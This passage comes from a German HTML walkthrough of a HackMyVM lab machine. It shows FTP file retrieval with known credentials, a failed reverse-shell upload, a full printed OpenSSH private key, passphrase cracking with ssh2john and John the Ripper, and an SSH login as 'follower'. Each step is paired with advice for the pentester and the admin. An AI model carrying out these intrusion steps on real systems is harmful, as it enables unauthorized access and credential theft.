+<span class="command">2025-05-01 00:40:53 (117 MB/s) - &apos;192.168.2.187:23333/dic.txt&apos; gespeichert [495]</span>
+
+<span class="command">BEENDET --2025-05-01 00:40:53--</span>
+<span class="command">Verstrichene Zeit: 0,008s</span>
+<span class="command">Geholt: 2 Dateien, 3,8K in 0,001s (7,27 MB/s)</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe `wget` mit der Option `-r` (rekursiv), dem FTP-URL mit den Anmeldedaten (`ftp://adriana:Lily2020@...`) und dem Port verwendet. `wget` konnte sich erfolgreich anmelden und die Dateien im zugänglichen FTP-Verzeichnis rekursiv herunterladen. Die Ausgabe zeigt, dass zwei Dateien heruntergeladen wurden: `dic.txt` und eine Datei namens `...`. Sie wurden im Verzeichnis `192.168.2.187:23333` im aktuellen Verzeichnis gespeichert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das erfolgreiche Herunterladen von Dateien über FTP ist ein guter Fortschritt. Die Datei `dic.txt` ist wahrscheinlich dieselbe Geschichte, die ich auf der `secret.php` Seite gesehen habe. Die Datei `...` mit einer Größe von 3414 Bytes und einem ungewöhnlichen Namen ist sehr verdächtig und könnte sensible Daten enthalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt der heruntergeladenen Datei `...` detailliert. Sie könnte Anmeldedaten, Konfigurationen oder andere wertvolle Informationen enthalten.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe die Dateiberechtigungen der auf dem FTP-Server zugänglichen Dateien. Stelle sicher, dass keine sensiblen Dateien für FTP-Benutzer lesbar sind.
+            </p>
+
+             <p>
+                 Ich habe das Verzeichnis gewechselt, in das `wget` die Dateien heruntergeladen hatte, und mir den Inhalt angesehen, insbesondere die verdächtige Datei `...`.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">cd 192.168.2.187:23333 </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/192.168.2.187:23333]
+└─#  <span class="command">ll</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+insgesamt 4
+<span class="command">-rw-r--r-- 1 root root 495  7. Mär 15:40 dic.txt</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/4-ZERO-3]
+└─#  <span class="command">cat dic.txt</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+The Lost Key
+
+<span class="command">Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, </span>
+<span class="command">she asked everyone in the village, but no one knew. One day, she discovered a locked </span>
+<span class="command">stone well. To her surprise, the key fit. She opened it and descended into a hidden </span>
+<span class="command">passage. There, she found an ancient chest filled with treasures. But the real treasure</span>
+<span class="command"> was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled,</span>
+<span class="command"> realizing the adventure was the real reward.</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich bin in das von `wget` erstellte Verzeichnis gewechselt (`cd 192.168.2.187:23333`). Der Befehl `ll` listet den Inhalt auf und zeigt nur `dic.txt`. Die Datei `...` wird hier nicht gelistet, was darauf hindeutet, dass `wget` sie vielleicht nicht unter diesem Namen gespeichert hat oder sie in einem Unterverzeichnis liegt (späterer `cat idkey` Befehl zeigt jedoch, dass sie existiert). Ich habe den Inhalt von `dic.txt` mit `cat` ausgelesen, was die gleiche Geschichte wie auf der `secret.php` Seite lieferte, nur hier komplett und in Englisch. Der Name `Lily` wird erneut erwähnt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Geschichte in `dic.txt` bestätigt den Inhalt von `secret.php?aaa=...` und die Namen `adriana` und `Lily`. Die Geschichte selbst könnte ein Rätsel oder Hinweis sein. Die Tatsache, dass die Datei `...` hier nicht erscheint, ist verwirrend, aber der spätere erfolgreiche Aufruf von `cat idkey` (was ein umbenanntes `...` zu sein scheint) zeigt, dass sie heruntergeladen wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behalte die Namen `adriana` und `Lily` und die Geschichte im Hinterkopf für mögliche Passwort-Rätsel oder Hinweise. Untersuche die Datei `...` (oder wie auch immer sie gespeichert wurde) genauer. Die Verwirrung um den Dateinamen muss geklärt werden.
+                <br><strong>Empfehlung (Admin):</strong> Entferne diese Notizdatei vom FTP-Server, wenn sie nicht zwingend dort sein muss.
+            </p>
+
+            <p>
+                Ich habe versucht, die Home-Verzeichnisse der Benutzer `follower` und `softly` über FTP einzusehen.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+ftp&gt; <span class="command">dir /home</span>
+<span class="command">229 Entering Extended Passive Mode (|||36730|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-x---    4 1000     1000         4096 Mar 09 08:59 follower</span>
+<span class="command">drwxr-x---    3 1001     1001         4096 Mar 07 13:39 softly</span>
+<span class="command">226 Directory send OK.</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe das Verzeichnis `/home` über FTP aufgelistet (`dir /home`). Die Ausgabe zeigt die Home-Verzeichnisse von `follower` (UID/GID 1000) und `softly` (UID/GID 1001). Die Berechtigungen (`drwxr-x---`) zeigen, dass diese Verzeichnisse nur für den Besitzer und Root zugänglich sind (Lesen/Ausführen). Der FTP-Benutzer `adriana` (wahrscheinlich eine andere UID) hat keinen Zugriff.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies bestätigt die Existenz der Benutzer `follower` und `softly` und ihre UIDs. Ihre Home-Verzeichnisse sind über FTP nicht direkt lesbar, was eine gute Sicherheitseinstellung ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf andere Wege, um Anmeldedaten für `follower` oder `softly` zu erhalten. Die aus der Datenbank geknackten Hashes könnten für diese Benutzer sein, oder die Datei `...` könnte relevante Daten enthalten.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Home-Verzeichnisse nur für den jeweiligen Benutzer und Root zugänglich sind.
+            </p>
+
+             <p>
+                 Weitere Erkundungen über FTP, insbesondere im `/var` Verzeichnis, wo ich schon zuvor reinkam.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+ftp&gt; <span class="command">cd /var</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp&gt; <span class="command">ls</span>
+<span class="command">229 Entering Extended Passive Mode (|||22355|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x    2 0        0            4096 Mar 08 07:41 backups</span>
+<span class="command">drwxr-xr-x   12 0        0            4096 Mar 07 14:56 cache</span>
+<span class="command">drwxr-xr-x   29 0        0            4096 Mar 07 18:13 lib</span>
+<span class="command">drwxrwsr-x    2 0        50           4096 Jun 30  2022 local</span>
+<span class="command">lrwxrwxrwx    1 0        0               9 Jan 15  2023 lock -&gt; /run/lock</span>
+<span class="command">drwxr-xr-x    9 0        0            4096 Jun 22 21:40 log</span>
+<span class="command">drwxrwsr-x    2 0        8            4096 Jan 15  2023 mail</span>
+<span class="command">drwxr-xr-x    2 0        0            4096 Jan 15  2023 opt</span>
+<span class="command">lrwxrwxrwx    1 0        0               4 Jan 15  2023 run -&gt; /run</span>
+<span class="command">drwxr-xr-x    4 0        0            4096 Mar 07 04:07 spool</span>
+<span class="command">drwxrwxrwt    5 0        0            4096 Jun 22 22:09 tmp</span>
+<span class="command">drwx------    4 1000     1000         4096 Jul 03  2023 www</span>
+<span class="command">226 Directory send OK.</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe erneut das `/var` Verzeichnis über FTP aufgelistet. Die Ausgabe ist dieselbe wie zuvor und zeigt die Verzeichnisse innerhalb von `/var`, einschließlich `www`. Die Zeitstempel sind aktualisiert (z.B. `log` und `tmp` auf Juni 22 21:40/22:09), was darauf hindeutet, dass das System aktiv ist. Der `/var/www` Ordner bleibt für den FTP-Benutzer `adriana` unzugänglich.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese erneute Auflistung bestätigt die Dateisystemstruktur und die mangelnden Berechtigungen auf `/var/www`. Der Weg über das Platzieren einer Shell im Webroot über FTP ist nicht möglich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf andere Methoden zur Informationsbeschaffung und Privilege Escalation. Der Inhalt der heruntergeladenen Datei `...` und die geknackten Datenbank-Passwörter sind nun die vielversprechendsten Vektoren.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass FTP-Benutzer nicht in der Lage sind, Systemverzeichnisse einzusehen, die nicht für sie bestimmt sind.
+            </p>
+
+             <p>
+                 Ich habe versucht, eine Reverse Shell Datei über FTP in das `/tmp` Verzeichnis hochzuladen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+ftp&gt; <span class="command">cd /tmp</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp&gt; <span class="command">pwd</span>
+<span class="command">Remote directory: /tmp </span>
+ftp&gt; <span class="command">ls /var/mail</span>
+<span class="command">229 Entering Extended Passive Mode (|||41982|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">226 Directory send OK.</span>
+ftp&gt; <span class="command">ls</span>
+<span class="command">229 Entering Extended Passive Mode (|||19897|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x    2 0        0            4096 Mar 08 07:41 backups</span>
+<span class="command">drwxr-xr-x   12 0        0            4096 Mar 07 14:56 cache</span>
+<span class="command">drwxr-xr-x   29 0        0            4096 Mar 07 18:13 lib</span>
+<span class="command">drwxrwsr-x    2 0        50           4096 Jun 30  2022 local</span>
+<span class="command">lrwxrwxrwx    1 0        0               9 Jan 15  2023 lock -&gt; /run/lock</span>
+<span class="command">drwxr-xr-x    9 0        0            4096 Jun 22 21:40 log</span>
+<span class="command">drwxrwsr-x    2 0        8            4096 Jan 15  2023 mail</span>
+<span class="command">drwxr-xr-x    2 0        0            4096 Jan 15  2023 opt</span>
+<span class="command">lrwxrwxrwx    1 0        0               4 Jan 15  2023 run -&gt; /run</span>
+<span class="command">drwxr-xr-x    4 0        0            4096 Mar 07 04:07 spool</span>
+<span class="command">drwxrwxrwt    5 0        0            4096 Jun 22 22:09 tmp</span>
+<span class="command">drwxr-xr-x   14 0        0            4096 Jan 15  2023 usr</span>
+<span class="command">drwxr-xr-x   12 0        0            4096 Jul 03  2023 var</span>
+<span class="command">lrwxrwxrwx    1 0        0              28 Jul 03  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-23-amd64</span>
+<span class="command">lrwxrwxrwx    1 0        0              28 Jul 03  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-21-amd64</span>
+<span class="command">226 Directory send OK.</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+ftp&gt; <span class="command">put rev.<span class="command">php</span></span>
+local: rev.<span class="command">php</span> remote: rev.<span class="command">php</span>
+<span class="command">229 Entering Extended Passive Mode (|||38955|)</span>
+<span class="password">550 Permission denied.</span>
+ftp&gt; <span class="command">ls</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe versucht, in das `/tmp` Verzeichnis zu wechseln und eine Datei hochzuladen (`put rev.php`). Obwohl der Wechsel nach `/tmp` mit "250 Directory successfully changed." erfolgreich war, schlug der `put` Befehl mit "550 Permission denied." fehl. Das anschließende `ls` zeigt das Dateisystem vom Root aus an, was wahrscheinlich durch den vorherigen `cd ..` Befehl in das übergeordnete Verzeichnis des FTP-Root geschah.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Es ist nicht möglich, Dateien über FTP im `/tmp` Verzeichnis abzulegen. Die Schreibberechtigungen des FTP-Benutzers `adriana` sind sehr eingeschränkt. Dies eliminiert FTP als direkten Weg, um Werkzeuge oder Shells auf das System zu bringen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze andere Dienste oder Techniken, um Dateien auf das Zielsystem zu transferieren, falls dies für die Privilege Escalation notwendig wird (z.B. über eine Shell mit `wget`, `curl`, `scp` oder Base64-Encoding). Konzentriere dich weiter auf die heruntergeladene Datei `...`.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass FTP-Benutzer keine Schreibberechtigung in Systemverzeichnissen wie `/tmp` haben.
+            </p>
+
+            <p>
+                Der nächste Schritt konzentrierte sich auf die zuvor mit `wget` über FTP heruntergeladene verdächtige Datei `...` (die ich lokal in `idkey` umbenannt habe, wie im `cat idkey` Befehl impliziert). Die Dateigröße und der ungewöhnliche Name deuteten darauf hin, dass es sich um etwas Wichtiges handeln könnte. Ich habe ihren Inhalt ausgelesen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/192.168.2.56:23333]
+└─#  <span class="command">cd ..</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">cat idkey</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="command">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABB70bmFVK</span>
+<span class="command">EMBk/IyzHZGePZAAAAGAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQC9ICr5X/wX</span>
+<span class="command">PPzgtZGkB9ZIrvr/kW5QwpWYpgQQ71KGpdmDkh+1i5wJ/6bgjwDO77uzns85nwJPJKYAYF</span>
+<span class="command">dpn2GiEZFC+c3DGb0tjubo99A9OOMr2IQE8mLkKbntgEiwJ5DBx2h9x5IUhgy6IcqY8bsr</span>
+<span class="command">oeWymvP/+Rtg1l0BXaraOZzSSnhlWtxu98NiBO1gYGQC5LcJ9IrGqMR/EpSOZfhamuNvp0</span>
+<span class="command">WLW9Q0PVxkYhxLJV9n10+8RqkE5iJYxb93wGs5P/cnEEz/iFIkrNUhzXgTUPUeHpL2QQ3W</span>
+<span class="command">zhIOl/izHagF+A3kja+TwOqXEpj3abH64I/CkjIB8fEP0Erx6ufgsIxJ5adOio9kfsknRo</span>
+<span class="command">Yvb12XpWVZ73rPsLg7yG1ahnLhk1q6VtgMG+PWr6Hvn3lwxT2oh8VBK+statdP2jrBtI2S</span>
+<span class="command">8OBJ0arnpGVtSyD14b5IxSZ1QL/pfZ3dNAemhBrtm5xizNIcGtRvamwxd5aY+NrqUMZtyr</span>
+<span class="command">A6epquQ4zHZG0rt+G04zvu5boR+3emMLturzWrZ+5skSuRop4a+0lSaTrnpYWR9UkFL8cS</span>
+<span class="command">GQ2KqRsmJDldAFrvWEEc1jRLVLs6aGAnjoS9lI0kwCiGW6hCgaGeNXXLq6Tj40Q1Z3bIzG</span>
+<span class="command">/oyFnhUz2HLO8oW52SY5M7ZNtUmHn8NXe3WQNEhwnX2wAAB0COcUb/ribhnuu+QrDsep8I</span>
+<span class="command">r0BUBZvblgY3c7C9XYMquUzds5F1ozL6M8xVaERjJQmPgy20bUSvzS/RBm+1cenyaOcas5</span>
+<span class="command">kEzxcorkkt2xLYB/oBG4dQ1SnI0I//9ECMAOpRVZ4jHm6y/5ldA0gCTrB5fDP09WDRvFeK</span>
+<span class="command">CWQyhkHEMpyka0raDysthmpIC/haMuzOQL/N+aIQV5YWrOA5byW9VFh5Cd+5ggWfE7uQJK</span>
+<span class="command">Ca4IeZLEShPuajOV2UQl/+W7IUsPBJ9bSfcyQUkT3j8UI1Cjcw77sAuo/+OzK8u/dDOUXU</span>
+<span class="command">2SJoGyAkc01J8e9E2AzDNCb6vTuQPDDVjbIbCye7q5zr5C8GOAuyww5kpBr8OFa/bTwmt5</span>
+<span class="command">f6g+0wWwVODlNMz/zf17SrF11WfWg3VqyElMvWKYF8J74Jh1v8jcugpn8B72Htykeqc2q7</span>
+<span class="command">qae5QSLBA76o0snjwsdUtA682z+rywRpqVrNqtqIlmixClhJCvHtxpt/XjgCfu2ll1ySkp</span>
+<span class="command">GuR6zNrYmuFMQ4P5iJvlBPck5ruC/0pVJdxtr95CQA/qJN4pIiU/MAd/rZty6z5Dcmwpfe</span>
+<span class="command">E+f79FFLoehBVRT6tXUP2vmOAiEi/8eW8LjMPjD8gAUK1Ul6dq/KlXek/Brs74E8+fbknE</span>
+<span class="command">ypqUT35uFBXwpJienowDE6glQAzW6hBuH871d3IfDeYBktCNzzbnkLVfUhoceeMRKJ5ucf</span>
+<span class="command">egetjOJoZjALbUYPNsCFHgd/Y31VBE+ioI3Nd/ehVRCM3ZbHqEyWPNssRWWNoKNDpWeMu9</span>
+<span class="command">6POlmeiTLeg68myQc03IPZCDptDdakZsekOIPVkExQrsIs6SH7NWFDAlsfHdiE85ySRBv+</span>
+<span class="command">vJYCtuk7Az+0sPVdwjb0EvqV0UPczy36FEm7oY6IAY3hsujOsjAyOufb+Rk4tZFy1Colca</span>
+<span class="command">ta/ZIyHyRLEBsdM/G+9mjPH+oBjDkQ2i6gGMLwNTQsuOYR6edO0vfd0hZf4yyjMgbrlH4r</span>
+<span class="command">N8Wf3w2OdDM7jPTWobh+4crTzUwj4lWTKgzKsq19/440uKwoDYqB1mkT3zY+8m+cK7j6</span>
+<span class="command">C2Cve7wSOTkdQKv7eqtC8YSKV0IMnQY2oM0B83tqMgETNU2R9qIAe4Enj6+y7QRl3uhkuP</span>
+<span class="command">u82G98Am4TaheuC2h8NS5Un7Xag6kYgu9p0utg48bvubJn02D5KPasj7QHLd5Po1BsPCTh</span>
+<span class="command">vezomalp9ajAS/2LX9y535SxNAUZWKibsrYa/s0BQZtrF/nKemJFlRHBt+97WUPg6iY4Tn</span>
+<span class="command">Z+qS7uohEmvONXce7s/p4P+S5KBPkMTV8M5RuYpFGxoqhq9D7ZoX1v3KYbwvde5phh3Zz2</span>
+<span class="command">jNrt7WqwHTqu1+SdVN3mH7pl8Irbm/5xmfz+cA2vAN2LwylUkTN3VfEKyDCUMnx8mMp0IL</span>
+<span class="command">xV6oLA6LejOAcTEURF4ju7kdMb8aY8gDjD8DXTi3KjG3aMI0bvTy5YXyPgWO9DNGiOm3f5</span>
+<span class="command">mE8rUScOIs5S6zSFQBIC1Iy0rvfT3kG146hoKwYFacI5m7N/5m4sySl+FQ3B/XnF7YXjrQ</span>
+<span class="command">BcVuWJb4G+VZDzTgXRCSuh+ReBAIcTKqsLi2aCWWCjadTWC33qYC+IEMAqbLKe+l/EY+4E</span>
+<span class="command">YIcSOf7UgkCGwNT6O9cbgvJkqzx2aWWNbzLo585dCGu4wJQOJmqPt/0tOk3CQM2ZFxNnco</span>
+<span class="command">1Q2eOMNDK2SQe16jRSc8bxgZBA3b1BRJZi8t/Pv2JXG9hBHduZVw2FhrvjJBa0lnyjGGml</span>
+<span class="command">gzCM2/x3wzbbMKd6wvuIYOCPr+kawbRy3Fg5QjH43y+guX0mGolqv9E6jTl3SvRcaSMyr4</span>
+<span class="command">OXcS4zv2qQEVu3us1NMp+Hp/tP7UbWKMdn16JTwNjIJy0auGFfnVFphZxsuVOeT8eLp8LH</span>
+<span class="command">SD16KO97RR/nkfAeXNEytKNREHTqyUHWKicGbs/vzerUC6rLCHEGHaxbj791QYMpxw82tR</span>
+<span class="command">z/9IM6vgQn3qHiJo2R5i+A5kaVIewtMPxkgcjIMVOQTWiC6XGXcgk4iAUKBumIGgWVBvOx</span>
+<span class="command">STsFBoEPac2n4IHUwHDWQWg9DG9xPGONtk9FBXQFgCFz/rl8j2B5AgZNuxifQMWskryjES</span>
+<span class="command">Kw5cAgkB5ln+HMTfdXpRuhFUiSnosRnt1xSmhx/mKrJ+Xr/1IhsosTSpzMQRp6PAdHRGM0</span>
+<span class="command">StZ/5SZiHX6OGoFkt4BoiEfdMPrMm4FQb2Pd8q5V31onx3/oix5B3Yid1ucjXiIR328MTp</span>
+<span class="command">ez/a9W0Yj8ardy+nWwyuKkipX8su3jEyBJDNNK6BEkiawAkDHA8xEM1Mv8KQOqZcIaTNP7</span>
+<span class="command">h1UV7zjcVmvXRELire4R3F9ebHK8jymoDg3pkWw+4CYDfd61ODiznY1CthpmN0O6JTC8OX</span>
+<span class="command">b2u2x7+meQ7pwKCcMsmCmNoj1WGEspAkYjER4LLwgendYeFEKdD7kBJP3dA1ZbpRGLNnq2</span>
+<span class="command">SG3w==</span>
+<span class="command">-----END OPENSSH PRIVATE KEY-----</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der Datei `...` (hier lokal als `idkey` betrachtet) wurde mit `cat` ausgelesen. Die Ausgabe zeigt eine Base64-kodierte Zeichenkette eingerahmt von `-----BEGIN OPENSSH PRIVATE KEY-----` und `-----END OPENSSH PRIVATE KEY-----`. Dies ist eindeutig ein OpenSSH privater Schlüssel. Private Schlüssel werden für die Authentifizierung über SSH verwendet, typischerweise in Kombination mit einer Passphrase.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden eines privaten SSH-Schlüssels ist ein kritischer Fund. Dieser Schlüssel könnte den Zugang zu einem oder mehreren Benutzerkonten über SSH ermöglichen. Da der Schlüssel wahrscheinlich mit einer Passphrase geschützt ist, muss diese Passphrase geknackt werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Speichere den privaten Schlüssel sicher. Verwende Tools wie `ssh2john` und `john` oder Hashcat, um die Passphrase für diesen Schlüssel zu knacken. Versuche dann, dich mit dem Schlüssel und der geknackten Passphrase per SSH als bekannte Systembenutzer (`follower`, `softly`, `admin`, `dev`, `user`, `intern`, `support` aus früheren Funden) anzumelden.
+                <br><strong>Empfehlung (Admin):</strong> Speichere niemals private SSH-Schlüssel auf Systemen, die über unprivilegierte Zugänge (wie FTP) kompromittierbar sind. Überprüfe, wo SSH-Schlüssel gespeichert werden und wer Zugriff darauf hat. Erzwinge die Verwendung starker Passphrases für private Schlüssel.
+            </p>
+
+            <p>
+                Da der private SSH-Schlüssel gefunden wurde, musste ich nun die dazugehörige Passphrase knacken, um ihn nutzen zu können. Ich habe den Schlüssel in ein Format umgewandelt, das von John the Ripper verarbeitet werden kann, und dann versucht, die Passphrase mit der RockYou-Wortliste zu knacken.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">chmod 600 idkey</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">ssh2john idkey &gt; hash</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Using default input encoding: UTF-8
+Loaded <span class="command">1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span>
+<span class="command">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes</span>
+<span class="command">Cost 2 (iteration count) is 24 for all loaded hashes</span>
+Will run <span class="command">12 OpenMP threads</span>
+Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
+<span class="password">cassandra        (idkey)</span>
+<span class="command">1g 0:00:00:13 DONE (2025-06-22 23:25) 0.07462g/s 85.97p/s 85.97c/s 85.97C/s marie1..stars</span>
+Use the &quot;--show&quot; <span class="command">OPTION</span> to display all of the cracked passwords reliably
+<span class="password">Session completed.</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Zuerst habe ich die Dateiberechtigungen des privaten Schlüssels (`idkey`) mit `chmod 600` auf sicher gesetzt. Dann habe ich das Tool `ssh2john` verwendet, um den privaten Schlüssel in ein Hash-Format umzuwandeln, das John the Ripper verarbeiten kann, und das Ergebnis in eine Datei namens `hash` umgeleitet. Schließlich habe ich John the Ripper (`john`) mit der RockYou-Wortliste (`--wordlist=...`) auf die Hash-Datei (`hash`) angesetzt. John erkannte den SSH-Schlüssel-Hash und begann den Cracking-Prozess. Der Angriff war erfolgreich! John konnte die Passphrase knacken: `<span class="password">cassandra</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg beim Knacken der Passphrase für den privaten SSH-Schlüssel. Ich habe nun die Passphrase (`<span class="password">cassandra</span>`) und den privaten Schlüssel. Dies ermöglicht mir die Authentifizierung über SSH mit dem Benutzerkonto, das diesem Schlüssel zugeordnet ist. Dies ist ein sehr wichtiger Schritt für den Initial Access oder die horizontale Privilege Escalation. Die Passphrase war in der RockYou-Wortliste enthalten, was auf eine schwache oder gängige Passphrase hindeutet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche nun, dich mit dem privaten Schlüssel (`idkey`) und der Passphrase (`cassandra`) per SSH am Zielsystem anzumelden. Teste die bekannten Benutzernamen (`follower`, `softly`, etc.), um herauszufinden, welchem Benutzer der Schlüssel gehört.
+                <br><strong>Empfehlung (Admin):</strong> Erzwinge die Verwendung starker, einzigartiger Passphrases für private SSH-Schlüssel. Implementiere eine Richtlinie, die das Speichern privater Schlüssel auf Systemen mit unsicheren Zugängen verbietet.
+            </p>
+
+             <p>
+                 Mit dem geknackten SSH-Schlüssel und der Passphrase habe ich versucht, mich per SSH als die identifizierten Benutzer `softly` und `follower` am Zielsystem anzumelden, da diese Home-Verzeichnisse in `/home` hatten.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">ssh softly@chromee.hmv -i idkey</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+The authenticity of host &apos;chromee.hmv (<span class="command">192.168.2.56</span>)&apos; can&apos;t be established.
+ED25519 key fingerprint is <span class="command">SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns</span>.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:11: [hashed name]
+...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added &apos;chromee.hmv&apos; (ED25519) to the list of known hosts.
+<span class="password">softly@chromee.hmv: Permission denied (publickey).</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">ssh follower@chromee.hmv -i idkey</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+The authenticity of host &apos;chromee.hmv (<span class="command">192.168.2.56</span>)&apos; can&apos;t be established.
+ED25519 key fingerprint is <span class="command">SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns</span>.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:11: [hashed name]
+...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added &apos;chromee.hmv&apos; (ED25519) to the list of known hosts.
+<span class="command">Enter passphrase for key &apos;idkey&apos;: </span>
+<span class="command">Enter passphrase for key &apos;idkey&apos;: </span>
+<span class="password">follower@Chromee:~$</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe versucht, mich mit dem privaten SSH-Schlüssel `idkey` als Benutzer `softly` anzumelden. Die Verbindung wurde aufgebaut, aber die Authentifizierung schlug fehl ("Permission denied (publickey)"). Dann habe ich versucht, mich als Benutzer `follower` mit demselben Schlüssel anzumelden. Das System fragte nach der Passphrase für den Schlüssel. Nach Eingabe der geknackten Passphrase `<span class="password">cassandra</span>` war die Authentifizierung erfolgreich und ich erhielt eine interaktive Shell als Benutzer `follower`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der private SSH-Schlüssel gehört zum Benutzer `follower`, und ich konnte mich erfolgreich am Zielsystem als `follower` authentifizieren und eine Shell erhalten. Dies ist ein weiterer erfolgreicher Weg zum Initial Access (zusätzlich zur SQL Injection und dem FTP-Zugang). Dies ist ein kritischer Moment im Test, da ich nun interaktiven Zugriff auf das System als nicht-privilegierter Benutzer habe.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die erhaltene Shell (z.B. mit `stty`). Beginne sofort mit der systeminternen Aufklärung als Benutzer `follower`, um einen Weg zur Privilege Escalation zu Root zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Entferne den unsicheren privaten SSH-Schlüssel vom System oder ändere die Passphrase auf eine starke, eindeutige Phrase, die nicht in Wortlisten enthalten ist. Überprüfe die Berechtigungen des Schlüssels und stelle sicher, dass er nicht für unbefugte Benutzer lesbar ist. Deaktiviere die passwortlose Authentifizierung per Schlüssel, wenn nicht zwingend benötigt.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p>
